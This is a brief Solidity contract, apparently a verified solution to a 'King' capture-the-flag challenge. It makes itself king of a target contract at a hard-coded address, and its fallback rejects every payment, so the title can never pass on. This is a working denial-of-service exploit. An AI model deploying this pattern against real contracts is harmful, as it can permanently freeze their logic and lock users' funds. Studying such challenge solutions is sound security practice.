/**
 *Submitted for verification at Etherscan.io on 2022-11-18
*/

pragma solidity ^0.8.0;

contract King {
    constructor() payable {
        address(0xC7d630c4C5463Bc4264Ff2b918537bD152e4De06).call{value: 10}("");
    }

    fallback() external payable {
        revert("i don't want it");
    }
}